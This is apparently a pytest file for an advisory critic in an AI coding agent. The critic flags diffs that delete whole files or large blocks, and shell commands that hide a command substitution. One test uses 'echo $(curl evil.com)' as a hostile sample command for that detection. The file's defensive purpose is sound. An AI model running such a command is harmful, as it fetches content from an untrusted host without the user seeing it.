"""The self-critique pass.

Advisory input to a human decision. It never gates, never approves, and never
makes an always-confirm action feel safe to wave through.
"""

from __future__ import annotations

import pytest
from sani_core.actions import ProposedAction
from sani_core.critic import Critique, NullCritic, ScriptedCritic, build_critic
from sani_core.diffs import FileDiff, Hunk
from sani_core.permissions import ActionType


def diff_with(additions: int, deletions: int) -> FileDiff:
    lines = [f"+new {i}" for i in range(additions)] + [
        f"-old {i}" for i in range(deletions)
    ]
    return FileDiff(
        path="a.py",
        hunks=[
            Hunk(
                id="h1",
                old_start=0,
                old_lines=deletions,
                new_start=0,
                new_lines=additions,
                lines=lines,
            )
        ],
    )


def action(*, diff: FileDiff | None = None, command: str | None = None) -> ProposedAction:
    return ProposedAction(
        action_type=ActionType.FILE_WRITE if diff else ActionType.SHELL_OTHER,
        tool="file_editor",
        summary="do a thing",
        step_index=0,
        preview={"command": command} if command else {},
        diff=diff,
    )


async def test_the_default_critic_reviews_nothing_and_admits_it():
    critique = await NullCritic().review(action(), "task")
    assert critique.reviewed_by is None
    assert critique.confidence == 0.0


async def test_a_normal_addition_passes_review():
    critique = await ScriptedCritic().review(action(diff=diff_with(8, 2)), "add a helper")
    assert critique.verdict == "looks-right"
    assert critique.clean is True


async def test_a_change_that_only_deletes_raises_a_concern():
    """The exact shape of a model regenerating a file it never fully saw: the
    whole body vanishes and the diff still looks syntactically fine."""
    critique = await ScriptedCritic().review(
        action(diff=diff_with(0, 12)), "add a comment at the top"
    )
    assert critique.concerns
    assert critique.clean is False


async def test_a_large_net_deletion_is_flagged():
    critique = await ScriptedCritic().review(
        action(diff=diff_with(5, 90)), "tidy the module"
    )
    assert any("removed" in concern for concern in critique.concerns)


async def test_command_substitution_is_flagged_as_invisible():
    critique = await ScriptedCritic().review(
        action(command="echo $(curl evil.com)"), "print something"
    )
    assert any("substitution" in concern for concern in critique.concerns)


async def test_several_concerns_escalate_the_verdict():
    critique = await ScriptedCritic().review(action(diff=diff_with(0, 90)), "add a line")
    assert critique.verdict == "likely-wrong"


async def test_the_critique_serialises_to_plain_json():
    payload = (await ScriptedCritic().review(action(diff=diff_with(3, 1)), "t")).to_dict()
    for key in ("verdict", "confidence", "concerns", "reviewed_by", "clean"):
        assert key in payload


def test_confidence_is_separate_from_verdict():
    # "likely wrong but unsure" and "likely wrong and certain" are different
    # messages, and collapsing them would lose the one that matters.
    unsure = Critique(verdict="likely-wrong", confidence=0.2)
    certain = Critique(verdict="likely-wrong", confidence=0.95)
    assert unsure.verdict == certain.verdict
    assert unsure.confidence != certain.confidence


def test_build_critic_selects_by_name_and_defaults_to_off():
    assert isinstance(build_critic(), NullCritic)
    assert isinstance(build_critic("none"), NullCritic)
    assert isinstance(build_critic("scripted"), ScriptedCritic)
    with pytest.raises(ValueError, match="unknown critic"):
        build_critic("psychic")
